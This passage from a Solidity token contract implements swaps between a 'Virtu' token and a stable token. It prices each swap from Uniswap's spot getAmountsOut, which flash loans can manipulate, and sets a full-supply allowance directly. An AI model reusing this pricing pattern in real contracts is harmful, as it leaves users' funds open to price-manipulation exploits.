        _basicTransfer(pFlashAddress,flash, balanceOf(pFlashAddress));
        pFlashAddress = flash;
        pVirtuUsdt.changeFlashAddress(flash);

    }
    function getFundIsOpen() public view returns(bool)
    {
        return pFund.getPrivateFundOpen();
    }

    function getExchangeState(address addr) public view returns(bool)
    {
        uint256 nowTime = block.timestamp;
        uint256 lastExchangeTime = exchangeMap[addr]; 
        return nowTime.sub(lastExchangeTime) > limitExchangeTime;
    }

    function onFlashVirtuToStable(uint256 amount) public returns(bool) {
        require(_limitAddressMap[msg.sender] != 1, "ERC20: transfer is limit");
        if(pFund.getIsHolder(msg.sender) && msg.sender.isContract() == false  && pFund.getPrivateFundOpen()==true)
        {
            require(genesisBlock != 0 && block.number > ( genesisBlock + fundsOperateBlock), "ERC20: limit private funds transfer ");
        }
        require(amount > mixVirtuToSatbel,"error: onFlashVirtuToStable  amount > 0");
        _basicTransfer(msg.sender,address(pVirtuUsdt), amount);
         _allowances[address(pVirtuUsdt)][address(uniswapV2Router)] = _totalSupply;
        uint256 outAmounts = getVirtuToUsdtNum(amount);
        pVirtuUsdt.tokenTransfer(pFlashAddress,msg.sender,outAmounts);
        return true;
    }

    function onFlashStableToVirtu(uint256 amount) public returns(bool) {
        require(pVirtuUsdt.balanceOf(pFlashAddress) > 0," error: flash no enough virtu");
        uint256 nowTime = block.timestamp;
        uint256 lastExchangeTime = exchangeMap[msg.sender]; 
        require(nowTime.sub(lastExchangeTime) > limitExchangeTime," error: you can't flash virtu");
        uint256 outAmounts = getUsdtToVirtuNum(amount);
        require(balanceOf(pFlashAddress) > outAmounts," error: flash no enough virtu");
        pVirtuUsdt.tokenTransfer(msg.sender,pFlashAddress,amount);
        _basicTransfer(pFlashAddress,msg.sender, outAmounts);
        exchangeMap[msg.sender] = block.timestamp; 
        return true;
    }
  
  
    function getVirtuToBNBNum(uint256 virtuAmount)  public view returns(uint[] memory amounts) 
    {
        address[] memory path = new address[](2);
        path[0] = address(address(this));
        path[1] = address(uniswapV2Router.WETH());
        return uniswapV2Router.getAmountsOut(virtuAmount,path);
    }
    
 
    function getVirtuToUsdtNum(uint256 virtuAmount)  public view returns(uint256) 
    {
        address[] memory path = new address[](3);
        path[0] = address(address(this));
        path[1] = address(uniswapV2Router.WETH());
        path[2] = address(usdtAddress);
         uint[] memory getAmounts = uniswapV2Router.getAmountsOut(1*10**_decimals,path);
        uint256 outNum = getAmounts[2].mul(virtuAmount).div(1*10**_decimals);
        return outNum;
    }

   
    function getUsdtToVirtuNum(uint256 usdtAmount)  public view returns(uint256) 
    {
        address[] memory path = new address[](3);
        path[0] = address(usdtAddress);
        path[1] = address(uniswapV2Router.WETH());
        path[2] = address(address(this));
        uint[] memory getAmounts = uniswapV2Router.getAmountsOut(1*10**_decimals,path);
        uint256 outNum = getAmounts[2].mul(usdtAmount).div(1*10**_decimals);
       return outNum;
    }

   
}